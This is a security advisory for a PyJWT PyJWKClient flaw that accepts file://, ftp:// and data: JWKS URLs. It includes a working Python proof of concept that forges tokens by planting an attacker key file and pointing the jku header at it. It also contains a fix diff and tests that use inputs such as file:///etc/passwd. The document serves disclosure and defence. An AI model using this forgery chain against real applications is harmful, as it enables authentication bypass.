# [M] PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes

## Summary
Severity: Medium
Advisory: GHSA-993g-76c3-p5m4
CVE: CVE-2026-48522
CWE: CWE-441, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-993g-76c3-p5m4
Type: github-advisory

## Affected
- PyPI: `PyJWT` — affected >=2.0.0 <2.13.0

## Details
> [!NOTE]
> The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.

## Summary

PyJWKClient passes its `uri` argument directly to `urllib.request.urlopen()` which uses Python stdlib's default `OpenerDirector` registering `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, **`FileHandler`**, and `DataHandler`. There is currently no documented option to restrict which schemes PyJWKClient will fetch.

If an application's `jku` URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:

1. Cause PyJWKClient to read arbitrary local files via `file://` (SSRF on local filesystem) — the file's contents are passed to `json.load`.
2. Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).
3. **Forge tokens that PyJWT verifies as valid** — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and `jwt.decode()` accepts.

## Affected versions

Tested and reproducible on **PyJWT 2.11.0 and 2.12.1**. Likely all versions back to PyJWKClient introduction.

## Reproducer (full attack chain — verified empirically)

```python
import jwt as pyjwt
from jwt import PyJWKClient
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, time

# Attacker generates keypair (no relation to real IdP)
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_n = key.public_key().public_numbers().n

def b64u(n):
    bl = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()

# Attacker writes JWK Set containing their public key to /tmp
jwks = {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256",
                  "n":b64u(pub_n),"e":"AQAB"}]}
with open("/tmp/attacker.json","w") as f:
    json.dump(jwks, f)

# Attacker mints token signed with their private key, jku=file://
priv_pem = key.private_bytes(serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
now = int(time.time())
token = pyjwt.encode(
    {"sub":"attacker","aud":"target-app","iat":now,"exp":now+3600},
    priv_pem, algorithm="RS256",
    headers={"kid":"attacker","jku":"file:///tmp/attacker.json","typ":"JWT"})

# Vulnerable application pattern: caller derives jku from token header
# and passes to PyJWKClient without scheme validation
header = pyjwt.get_unverified_header(token)
client = PyJWKClient(header["jku"])      # <-- accepts file:// silently
key_obj = client.get_signing_key_from_jwt(token)
decoded = pyjwt.decode(token, key_obj.key, algorithms=["RS256"],
                       audience="target-app")
print("Token verified:", decoded)
# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}
```

## Cross-library evidence — PyJWT is the outlier

The same composition pattern is structurally safe in 4 other mainstream JWT libraries:

| Library | Behavior on `jku=file://...` | Mechanism |
|---|---|---|
| **PyJWT 2.12.1** (Python) | **Reads file from disk, parses, uses for signature verification** | urllib default OpenerDirector includes FileHandler |
| panva/jose 6.2.3 (Node.js) | Refuses pre-fetch | WHATWG `fetch()` rejects non-http(s) at fetch-spec layer |
| golang-jwt + MicahParks/keyfunc v3.4.0 (Go) | Refuses pre-fetch | `http.DefaultTransport` only registers http/https |
| Microsoft.IdentityModel.Tokens 8.18.0 (.NET) | Refuses pre-fetch | `HttpDocumentRetriever` defaults `RequireHttps=true` |
| Spring Security NimbusJwtDecoder 6.3.4 (Java) | Refuses pre-fetch | URI parser delegation refuses non-http(s) at request build |

PyJWT is the only library of these 5 where the default behavior allows `file://` to reach the fetch layer.

## Recommended fix

Add `allowed_schemes: tuple[str, ...] = ("https", "http")` kwarg to `PyJWKClient.__init__`. Pre-validate URL scheme before invoking `urllib.request.urlopen`. URLs with disallowed schemes raise `PyJWKClientError` before any fetch is attempted.

### Diff sketch against `jwt/jwks_client.py`

```python
def __init__(
    self, uri: str,
    cache_keys: bool = False, max_cached_keys: int = 16,
    cache_jwk_set: bool = True, lifespan: float = 300,
    headers: dict[str, Any] | None = None, timeout: float = 30,
    ssl_context: SSLContext | None = None,
    allowed_schemes: tuple[str, ...] = ("https", "http"),  # NEW
):
    """...
    :param allowed_schemes: URL schemes the JWKS endpoint is permitted
        to use. Default ``("https", "http")``. Pass ``("https",)`` for
        HTTPS-only operation. URLs with disallowed schemes raise
        ``PyJWKClientError`` before any fetch is attempted.
    """
    # ... existing init code ...
    self.allowed_schemes = allowed_schemes
    self._validate_uri_scheme()


def _validate_uri_scheme(self) -> None:
    """Reject the configured URI early if its scheme isn't allowed."""
    from urllib.parse import urlparse
    parsed = urlparse(self.uri)
    scheme = parsed.scheme.lower()
    if not scheme:
        raise PyJWKClientError(
            f"PyJWKClient URI '{self.uri}' has no scheme; expected one of "
            f"{self.allowed_schemes!r}")
    if scheme not in self.allowed_schemes:
        raise PyJWKClientError(
            f"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes "
            f"{self.allowed_schemes!r}; refusing to fetch from this URL")
```

### Tests to add

```python
def test_pyjwkclient_rejects_file_scheme():
    with pytest.raises(PyJWKClientError, match="not in allowed_schemes"):
        PyJWKClient("file:///etc/passwd")

def test_pyjwkclient_rejects_ftp_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("ftp://example.org/keys.json")

def test_pyjwkclient_rejects_data_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient('data:application/json,{"keys":[]}')

def test_pyjwkclient_caller_can_lock_to_https_only():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("http://internal.test/jwks.json", allowed_schemes=("https",))
```

### Compatibility

- Default `allowed_schemes=("https", "http")` preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints
- Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)
- No changes to urllib fetch logic itself — the fix is a pre-validation gate

## Class precedent

This is the same class as **CVE-2024-21643** (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.

## Prior art (verified 2026-05-06)

Confirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):

- No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling
- No existing GitHub issue or PR addressing scheme allowlisting
- No silent fix in CHANGELOG through 2.12.1
- 5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class

## Credit

Reported by Keijo Tuominen — independent security research at CMHT.tech (https://cmht.tech).

Reproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.

## References
- https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4
- https://nvd.nist.gov/vuln/detail/CVE-2026-48522
- https://github.com/github/advisory-database/pull/8521
- https://github.com/jpadilla/pyjwt
- https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-175.yaml
